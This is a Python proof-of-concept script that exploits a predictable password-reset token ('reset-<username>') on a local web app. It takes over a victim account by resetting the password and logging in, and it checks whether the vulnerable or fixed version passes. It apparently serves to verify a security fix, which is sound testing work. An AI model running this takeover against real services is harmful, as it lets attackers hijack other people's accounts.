import time
import requests
import argparse

BASE_URL = "http://127.0.0.1:5000"


def forgot_password(username: str):
    start = time.time()
    response = requests.post(
        f"{BASE_URL}/forgot-password",
        json={"username": username},
        timeout=10,
    )
    elapsed = time.time() - start
    return response, elapsed


def reset_password(token: str, new_password: str):
    return requests.post(
        f"{BASE_URL}/reset-password",
        json={"token": token, "new_password": new_password},
        timeout=10,
    )


def login(username: str, password: str):
    return requests.post(
        f"{BASE_URL}/login",
        json={"username": username, "password": password},
        timeout=10,
    )


def main():
    global BASE_URL

    parser = argparse.ArgumentParser(description="PoC password reset takeover: predictable token vs fixed one-time random token.")
    parser.add_argument("--base-url", default=BASE_URL)
    parser.add_argument("--victim", default="diana")
    parser.add_argument("--expected", choices=["vulnerable", "fixed"], default="fixed")
    args = parser.parse_args()

    BASE_URL = args.base_url.rstrip("/")
    victim_username = args.victim
    attacker_new_password = "Hacked123!"

    print("=== Password reset takeover PoC ===")
    print(f"Target: {BASE_URL}")
    print(f"Expected mode: {args.expected}")
    print("Vulnerable: forgot-password exposes or allows a predictable token such as reset-<username>.")
    print("Fixed: forgot-password does not return the token; predicted token is rejected.\n")

    print("[1] Trigger forgot-password for victim...")
    fp_response, elapsed = forgot_password(victim_username)
    print("status:", fp_response.status_code, "time:", round(elapsed, 4), "s")
    print("body:", fp_response.text)

    # Vulnerability: predictable token format in v1.
    predicted_token = f"reset-{victim_username}"
    print("\n[2] Use predicted token:", predicted_token)

    rp_response = reset_password(predicted_token, attacker_new_password)
    print("status:", rp_response.status_code)
    print("body:", rp_response.text)

    print("\n[3] Verify takeover by logging in with victim + new password...")
    login_response = login(victim_username, attacker_new_password)
    print("status:", login_response.status_code)
    print("body:", login_response.text)

    takeover_succeeded = login_response.status_code == 200
    print("\n=== Result ===")
    if args.expected == "fixed":
        token_leaked = "reset_token" in fp_response.text
        print("PASS" if not token_leaked and not takeover_succeeded else "FAIL: fixed mode leaked token or allowed takeover.")
    else:
        print("PASS" if takeover_succeeded else "CHECK MANUALLY: vulnerable mode should allow takeover with predicted token.")


if __name__ == "__main__":
    main()

